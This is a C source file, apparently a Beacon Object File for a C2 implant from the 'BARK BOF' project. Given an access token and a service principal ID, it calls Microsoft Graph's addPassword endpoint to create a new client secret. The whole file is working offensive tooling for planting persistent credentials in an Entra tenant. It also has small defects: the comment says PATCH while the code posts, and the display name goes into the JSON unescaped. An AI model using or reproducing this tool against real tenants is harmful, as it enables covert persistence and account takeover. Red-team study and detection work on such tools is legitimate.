/*
 * new_entra_sp_secret.c — BARK BOF
 * New-EntraServicePrincipalSecret — Create a new secret for a service principal
 *
 * PATCH https://graph.microsoft.com/v1.0/servicePrincipals/{id}/addPassword
 *
 * The secret value is generated server-side by Entra and returned in the
 * response. The caller controls the display name (the label shown in the
 * Azure portal next to the credential).
 *
 * Args : token, servicePrincipalId [, secretDisplayName]
 *        secretDisplayName defaults to "BARK-BOF-Secret" if omitted or empty.
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512];
    char   bodyBuf[512];
    LPWSTR widePath          = NULL;
    char  *token             = NULL;
    char  *servicePrincipalId = NULL;
    char  *secretDisplayName  = NULL;
    const char *displayName   = NULL;

    BeaconDataParse(&parser, args, alen);
    token             = BeaconDataExtract(&parser, NULL);
    servicePrincipalId = BeaconDataExtract(&parser, NULL);
    secretDisplayName  = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_new_entra_sp_secret <token> <servicePrincipalId> [secretDisplayName]\n");
        return;
    }

    /* Use provided display name or fall back to default */
    displayName = (secretDisplayName && MSVCRT$strlen(secretDisplayName) > 0)
                  ? secretDisplayName
                  : "BARK-BOF-Secret";

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"displayName\":\"%s\"}", displayName);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/v1.0/servicePrincipals/%s/addPassword", servicePrincipalId);

    widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] New-EntraServicePrincipalSecret for SP %s (displayName: %s)\n",
        servicePrincipalId, displayName);

    BarkPost(L"graph.microsoft.com", widePath, L"POST",
             bodyBuf, token, "application/json");

    HFree(widePath);
}
